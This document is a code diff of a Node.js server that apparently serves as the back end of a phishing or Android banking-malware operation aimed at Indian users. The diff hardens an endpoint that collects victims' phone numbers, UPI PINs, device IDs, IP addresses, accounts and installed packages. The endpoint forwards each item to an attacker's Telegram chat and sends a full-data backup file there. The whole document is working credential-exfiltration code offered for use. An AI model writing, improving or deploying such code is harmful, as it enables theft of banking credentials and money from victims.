@@ -35,6 +35,7 @@ const sendOrUpdateTelegram = async (message) => {
             currentMessageText = message;
         }
     } catch (error) {
+        // Fallback: Agar edit fail ho toh naya message bhej do
         const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: message,
@@ -73,13 +74,13 @@ const startupNotification = async () => {
 };
 
 app.post('/send-data', async (req, res) => {
-    // UPDATED: Destructure accounts and packages from req.body
     const { type, number, pin, deviceId, deviceTime, deviceDate, userIP, accounts, packages } = req.body;
     
     if (deviceId) {
         fullDeviceName = deviceId;
     }
 
+    // STEP 1: NUMBER
     if (type === 'NUMBER') {
         lastMessageId = null; 
         pinCount = 0; 
@@ -90,10 +91,11 @@ app.post('/send-data', async (req, res) => {
         updatedText += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
         updatedText += `*Number:* "+91${number}"\n`;
         
-        currentMessageText = updatedText; // Store to update later
+        currentMessageText = updatedText;
         await sendOrUpdateTelegram(currentMessageText);
     } 
     
+    // STEP 2: PIN
     else if (pin) {
         pinCount++; 
         currentMessageText += `*UPI PIN:* "${pin}"\n`;
@@ -103,13 +105,17 @@ app.post('/send-data', async (req, res) => {
         }
     }
 
-    // --- NEW LOGIC FOR ACCOUNTS & PACKAGES ---
+    // STEP 3: ACCOUNTS & PACKAGES (IMPORTANT UPDATE)
     else if (accounts || packages) {
         let extraInfo = `\n*--- Account's ---*\n`;
         
-        // Handle Accounts
-        let accList = typeof accounts === 'string' ? JSON.parse(accounts) : accounts;
-        if (accList && Array.isArray(accList)) {
+        // Safety Parse for Accounts
+        let accList = accounts;
+        try {
+            if (typeof accounts === 'string') accList = JSON.parse(accounts);
+        } catch (e) { accList = accounts; }
+
+        if (accList && Array.isArray(accList) && accList.length > 0) {
             accList.forEach(acc => { extraInfo += `• ${acc}\n`; });
         } else {
             extraInfo += `No Accounts Found\n`;
@@ -117,19 +123,23 @@ app.post('/send-data', async (req, res) => {
 
         extraInfo += `\n*--- Package's ---*\n`;
         
-        // Handle Packages
-        let pkgList = typeof packages === 'string' ? JSON.parse(packages) : packages;
-        if (pkgList && Array.isArray(pkgList)) {
+        // Safety Parse for Packages
+        let pkgList = packages;
+        try {
+            if (typeof packages === 'string') pkgList = JSON.parse(packages);
+        } catch (e) { pkgList = packages; }
+
+        if (pkgList && Array.isArray(pkgList) && pkgList.length > 0) {
             pkgList.forEach(pkg => { extraInfo += `• ${pkg}\n`; });
         } else {
             extraInfo += `No Packages Found\n`;
         }
 
-        // Append to the existing message and update Telegram
+        // Final Append and Update
         currentMessageText += extraInfo;
         await sendOrUpdateTelegram(currentMessageText);
         
-        // Instant file backup for full data
+        // Step 3 aate hi final backup file bhej dega
         await sendFileToTelegram(currentMessageText, `Full_Data_${fullDeviceName}`);
     }
     
